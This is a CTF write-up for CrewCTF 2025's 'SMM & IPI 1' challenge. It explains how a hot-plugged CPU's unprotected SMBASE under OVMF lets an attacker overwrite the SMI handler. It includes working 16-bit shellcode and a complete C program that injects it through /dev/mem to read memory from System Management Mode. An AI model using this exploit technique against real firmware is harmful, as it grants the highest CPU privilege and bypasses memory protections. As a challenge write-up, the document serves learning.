+++
author = "vmpr0be"
title = "CrewCTF 2025 - SMM & IPI 1"
date = "2025-09-21"
categories = ["ctf"]
+++

# CrewCTF 2025 - SMM & IPI 1

### Vocabulary

- SMM: System Management Mode, a highly privileged CPU mode.
- SMRAM: A special region of memory that is only accessible from SMM.
- SMI: An interrupt that halts current execution and switches the CPU to SMM.
- SMBASE: The base of the memory region used for SMM components (e.g., the SMI handler and saved execution state). The default SMBASE is 0x30000.

### Overview

"You know what else OVMF does with SMM? CPU hotplugging. So I took a look.
**Flag is at physical memory 0x44440000 when read from SMM**."

This means we need to read the flag while the CPU is in SMM.

##### Hint

"I disabled something I should not have disabled. This link might help you understand what is going on: https://lore.kernel.org/all/8091f6e8-b1ec-f017-1430-00b0255729f4@redhat.com/T/"

The author also stated that interrupt logs can be extracted with a special flag:
``
-D interrupts.log -d int
``.
After hot-plugging the CPU with `./addcpu.sh`, we can see three SMIs triggered, meaning the newly plugged CPU is actually executing.

### Vulnerability

To summarize, the bug lies in the fact that when the CPU is hot-plugged, the SMBASE isn’t in SMRAM, which means the SMI handler isn’t protected.

By contrast, on a non-hot-plugged CPU, SMBASE is usually relocated into SMRAM.

### Exploitation

Since the SMI handler isn’t protected, when the hot-plugged CPU is added it will start its execution at the unprotected SMI handler at `SMBASE + 0x8000` (in this case: `0x38000`). We can patch that handler with our own code to read the flag from `0x44440000`.

When the interrupted CPU core switches to SMM, it expects the SMI handler to contain 16-bit instructions, so our injected shellcode must be 16-bit.

We need a physical region accessible outside SMM where we can store the flag read by our shellcode.

```bash
crewctf-2025:/root# cat /proc/iomem
...
00001000-0009ffff : System RAM
...
```

We’ll use `0x00001000` as storage.

#### Shellcode

The shellcode basically does the following:

- Read the flag from 0x44440000.
- Write the flag to our storage 0x1000.

```C
mov esi, 0x44440000   ; the flag address
mov edi, 0x1000       ; memory accessible by us
mov ecx, 64           ; bytes to be copied

copy_loop:
mov al, [esi]         ; read byte of the flag
mov [edi], al         ; store it in our storage
inc esi               ; next flag byte
inc edi               ; next storage byte
dec ecx               ; decrease counter
jnz copy_loop         ; loop again
```

#### Injection

**reveal.c:**
```C
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>
#include <string.h>

int main() {
    int fd;
    void *map;
    
    fd = open("/dev/mem", O_RDWR);
    if (fd < 0) {
        perror("open /dev/mem");
        return 1;
    }

    map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0x38000);
    if (map == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    unsigned char shellcode[] = {
        0x66, 0xBE, 0x00, 0x00, 0x44, 0x44,
        0x66, 0xBF, 0x00, 0x10, 0x00, 0x00,
        0x66, 0xB9, 0x40, 0x00, 0x00, 0x00,
        0x67, 0x8A, 0x06,
        0x67, 0x88, 0x07,
        0x66, 0x46,
        0x66, 0x47,
        0x66, 0x49,
        0x75, 0xF2
    };

    memcpy(map, shellcode, sizeof(shellcode));
    printf("Shellcode written to 0x38000\n");

    munmap(map, 0x1000);

    system("./addcpu.sh");

    map = mmap(NULL, 64, PROT_READ, MAP_SHARED, fd, 0x1000);
    if (map == MAP_FAILED) {
        perror("mmap");
        close(fd);
        return 1;
    }

    printf("Flag: %s\n", (char*)map);

    munmap(map, 64);
    close(fd);

    return 0;
}
```

Similarly, we compile and run this program, which will:
- Inject shellcode at 0x38000.
- Run the ./addcpu.sh script.
- Read the flag from 0x1000.

```bash
gcc reveal.c -o reveal
./reveal
```

```bash
Shellcode written to 0x38000
...
Flag: crew{but_why_isnt_addcpu_working_*REMOVED*}
```
